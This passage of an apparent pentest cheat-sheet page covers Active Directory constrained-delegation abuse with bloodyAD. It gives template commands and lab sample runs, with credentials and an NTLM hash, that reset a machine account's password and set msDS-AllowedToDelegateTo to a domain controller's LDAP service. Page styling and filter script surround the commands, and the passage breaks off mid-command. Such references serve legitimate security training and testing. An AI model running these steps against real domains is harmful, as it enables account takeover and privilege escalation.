1.05rem;&#xA;  color: var(--grey-darken-2);&#xA;  background: var(--bg);&#xA;  padding: 10px;&#xA;  text-align: center;&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-ker {&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-all    { grid-row: 2 / 4; grid-column: 1; }&#xA;.cell-pw     { grid-row: 2; grid-column: 2; }&#xA;.cell-ntlm   { grid-row: 3; grid-column: 2; }&#xA;.cell-ker    { grid-row: 2; grid-column: 3; }&#xA;.cell-subs   { grid-row: 3; grid-column: 3; }&#xA;&#xA; &#xA;.btn {&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  background: transparent;&#xA;  border: none;&#xA;  cursor: pointer;&#xA;  font-weight: 700;&#xA;  font-size: 0.9rem;&#xA;  color: inherit;&#xA;  text-align: center;&#xA;  padding: 12px 8px;&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid .cell:hover:not(.has-subrow) {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);  &#xA;}&#xA;.auth-grid .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;.sub-row {&#xA;  display: flex;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  gap: 1px;&#xA;  box-sizing: border-box;&#xA;}&#xA;.sub-item {&#xA;  flex: 1;&#xA;  background: var(--bg);&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  color: var(--fg);&#xA;  transition: background .12s ease, color .12s ease;&#xA;}&#xA;.sub-item .btn { width: 100%; height: 100%; }&#xA;&#xA;.sub-item:hover {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;.sub-item:has(.btn.active) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;body.dark-mode .auth-frame {&#xA;  border-color: var(--dm-line);&#xA;  background: var(--dm-line);&#xA;}&#xA;body.dark-mode .cell,&#xA;body.dark-mode .sub-item {&#xA;  background: var(--dm-bg);&#xA;  color: var(--dm-fg);&#xA;}&#xA;body.dark-mode .title {&#xA;  background: var(--dm-bg);&#xA;  color: #d5d5d5;&#xA;}&#xA;&#xA;body.dark-mode .cell:hover:not(.has-subrow) {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);  &#xA;}&#xA;body.dark-mode .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;body.dark-mode .sub-item:hover {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);&#xA;}&#xA;body.dark-mode .sub-item:has(.btn.active) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;&#xA; &#xA;.highlight.active-block pre {&#xA;  border: 1px solid var(--grey-lighten-3);&#xA;  border-radius: 0.2rem;&#xA;}&#xA;&#xA;.highlight.active-block.codeBlock pre:hover,&#xA;.highlight.active-block.codeBlock-start pre:hover,&#xA;.highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--secondary);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block pre {&#xA;  border-color: var(--grey-darken-4);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block.codeBlock pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-start pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--grey-lighten-1);&#xA;}&#xA;&#xA; &#xA;@media (max-width: 768px) {&#xA;  .auth-grid {&#xA;    grid-template-columns: 1fr;&#xA;    grid-template-rows: auto repeat(5, auto);&#xA;  }&#xA;  .cell-all,&#xA;  .cell-pw,&#xA;  .cell-ntlm,&#xA;  .cell-ker,&#xA;  .cell-subs {&#xA;    grid-row: auto;&#xA;    grid-column: 1;&#xA;  }&#xA;  .sub-row { flex-direction: column; }&#xA;}&#xA;&lt;/style&gt;&#xA;&#xA;&lt;script&gt;&#xA;document.addEventListener(&#34;DOMContentLoaded&#34;, () =&gt; {&#xA;  const buttons = document.querySelectorAll(&#34;.auth-grid .btn&#34;);&#xA;  const filters = [&#34;password&#34;, &#34;ntlm&#34;, &#34;password-based-kerberos&#34;, &#34;ntlm-based-kerberos&#34;, &#34;ticket-based-kerberos&#34;];&#xA;&#xA;  const filterMap = {&#xA;    password: [&#34;password&#34;],&#xA;    ntlm: [&#34;ntlm&#34;],&#xA;    &#34;kerberos-password&#34;: [&#34;password-based-kerberos&#34;],&#xA;    &#34;kerberos-ntlm&#34;: [&#34;ntlm-based-kerberos&#34;],&#xA;    &#34;kerberos-ticket&#34;: [&#34;ticket-based-kerberos&#34;],&#xA;    all: filters,&#xA;  };&#xA;&#xA;  function filterBlocks(filter) {&#xA;    const targetClasses = filterMap[filter] || [];&#xA;    const authClasses = [&#xA;      &#34;password&#34;,&#xA;      &#34;ntlm&#34;,&#xA;      &#34;password-based-kerberos&#34;,&#xA;      &#34;ntlm-based-kerberos&#34;,&#xA;      &#34;ticket-based-kerberos&#34;,&#xA;    ];&#xA;    const blocks = [...document.querySelectorAll(&#34;.highlight&#34;)];&#xA;    const groups = [];&#xA;    let current = [];&#xA;&#xA;    &#xA;    blocks.forEach(block =&gt; {&#xA;      current.push(block);&#xA;      const isEnd = block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      const isStandalone = block.classList.contains(&#34;codeBlock-start&#34;) &amp;&amp; block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      if (isEnd || isStandalone) {&#xA;        groups.push(current);&#xA;        current = [];&#xA;      }&#xA;    });&#xA;    if (current.length) groups.push(current);&#xA;&#xA;    &#xA;    groups.forEach(group =&gt; {&#xA;      const authBlocks = group.filter(b =&gt; authClasses.some(c =&gt; b.classList.contains(c)));&#xA;      if (!authBlocks.length) return; &#xA;&#xA;      &#xA;      if (filter === &#34;all&#34;) {&#xA;        authBlocks.forEach(b =&gt; {&#xA;          b.style.display = &#34;block&#34;;&#xA;          b.classList.remove(&#34;active-block&#34;);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      const matched = authBlocks.filter(b =&gt;&#xA;        targetClasses.some(tc =&gt; b.classList.contains(tc))&#xA;      );&#xA;&#xA;      if (matched.length &gt; 0) {&#xA;        &#xA;        authBlocks.forEach(b =&gt; {&#xA;          const visible = matched.includes(b);&#xA;          b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;          b.classList.toggle(&#34;active-block&#34;, visible);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      let fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;password&#34;));&#xA;      if (fallback.length === 0) {&#xA;        fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;ntlm&#34;));&#xA;      }&#xA;&#xA;      &#xA;      authBlocks.forEach(b =&gt; {&#xA;        const visible = fallback.includes(b);&#xA;        b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;        b.classList.toggle(&#34;active-block&#34;, visible);&#xA;      });&#xA;    });&#xA;  }&#xA;&#xA;  function setActiveButton(btn) {&#xA;    buttons.forEach(b =&gt; b.classList.remove(&#34;active&#34;));&#xA;    btn.classList.add(&#34;active&#34;);&#xA;    const filter = btn.dataset.filter;&#xA;    localStorage.setItem(&#34;authFilter&#34;, filter);&#xA;    filterBlocks(filter);&#xA;  }&#xA;&#xA;  const saved = localStorage.getItem(&#34;authFilter&#34;);&#xA;  const initial = saved &amp;&amp; filterMap[saved] ? saved : &#34;all&#34;;&#xA;  const initBtn = [...buttons].find(b =&gt; b.dataset.filter === initial);&#xA;  initBtn ? setActiveButton(initBtn) : filterBlocks(&#34;all&#34;);&#xA;&#xA;  buttons.forEach(btn =&gt; btn.addEventListener(&#34;click&#34;, () =&gt; setActiveButton(btn)));&#xA;});&#xA;&lt;/script&gt;&#xA;&#xA;&lt;br&gt;&#xA;&#xA;&#xA;&lt;div class=&#34;auth-wrapper&#34;&gt;&#xA;  &lt;div class=&#34;auth-frame&#34;&gt;&#xA;    &lt;div class=&#34;auth-grid&#34;&gt;&#xA;      &lt;div class=&#34;cell title&#34;&gt;Authentication Method&lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-all&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;all&#34;&gt;ALL&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-pw&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;password&#34;&gt;PASSWORD&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ntlm&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;ntlm&#34;&gt;NTLM&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ker&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;kerberos&#34;&gt;KERBEROS&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-subs has-subrow&#34;&gt;&#xA;        &lt;div class=&#34;sub-row&#34;&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-password&#34;&gt;PASSWORD&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-ntlm&#34;&gt;NTLM&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn active&#34; data-filter=&#34;kerberos-ticket&#34;&gt;TICKET&lt;/button&gt;&lt;/div&gt;&#xA;        &lt;/div&gt;&#xA;      &lt;/div&gt;&#xA;    &lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;constrained-delegation&#34;&gt;Constrained Delegation&lt;/h3&gt;&#xA;&lt;p&gt;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34; &gt;Linux&lt;/button&gt;&#xA;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab2&#34; &gt;Windows&lt;/button&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34;&gt;&lt;h4 id=&#34;1-control-of-a-machine-account&#34;&gt;1. Control of a Machine Account&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set password &amp;#39;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; --host 10.129.31.186 &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; password &lt;span class=&#34;s1&#34;&gt;&amp;#39;FS01$&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] Password changed successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;:&amp;lt;HASH&amp;gt;&amp;#39; -f rc4 --host &amp;lt;DC&amp;gt; set password &amp;#39;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;:2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -f rc4 --host DC.REDELEGATE.VL &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; password &lt;span class=&#34;s1&#34;&gt;&amp;#39;FS01$&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] Password changed successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; set password &amp;#39;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -k --host DC.REDELEGATE.VL &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; password &lt;span class=&#34;s1&#34;&gt;&amp;#39;FS01$&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] Password changed successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt; bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -f rc4 -k --host &amp;lt;DC&amp;gt; set password &amp;#39;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -f rc4 -k --host DC.REDELEGATE.VL &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; password &lt;span class=&#34;s1&#34;&gt;&amp;#39;FS01$&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] Password changed successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; set password &amp;#39;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -k --host DC.REDELEGATE.VL &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; password &lt;span class=&#34;s1&#34;&gt;&amp;#39;FS01$&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] Password changed successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2-set-msds-allowedtodelegateto-to-target-spn&#34;&gt;2. Set msDS-AllowedToDelegateTo to Target SPN&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set object &amp;#39;CN=&amp;lt;TARGET_MACHINE&amp;gt;,CN=COMPUTERS,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;msDS-AllowedToDelegateTo&amp;#39; -v &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; --host DC.REDELEGATE.VL &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; object &lt;span class=&#34;s1&#34;&gt;&amp;#39;CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;msDS-AllowedToDelegateTo&amp;#39;&lt;/span&gt; -v &lt;span class=&#34;s1&#34;&gt;&amp;#39;ldap/dc.redelegate.vl&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL&amp;#39;s msDS-AllowedToDelegateTo has been updated&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;:&amp;lt;HASH&amp;gt;&amp;#39; -f rc4 --host &amp;lt;DC&amp;gt; set object &amp;#39;CN=&amp;lt;TARGET_MACHINE&amp;gt;,CN=COMPUTERS,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;msDS-AllowedToDelegateTo&amp;#39; -v &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;:2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -f rc4 --host DC.REDELEGATE.VL &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; object &lt;span class=&#34;s1&#34;&gt;&amp;#39;CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;msDS-AllowedToDelegateTo&amp;#39;&lt;/span&gt; -v &lt;span class=&#34;s1&#34;&gt;&amp;#39;ldap/dc.redelegate.vl&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL&amp;#39;s msDS-AllowedToDelegateTo has been updated&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; set object &amp;#39;CN=&amp;lt;TARGET_MACHINE&amp;gt;,CN=COMPUTERS,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;msDS-AllowedToDelegateTo&amp;#39; -v &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -k --host DC.REDELEGATE.VL &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; object &lt;span class=&#34;s1&#34;&gt;&amp;#39;CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;msDS-AllowedToDelegateTo&amp;#39;&lt;/span&gt; -v &lt;span 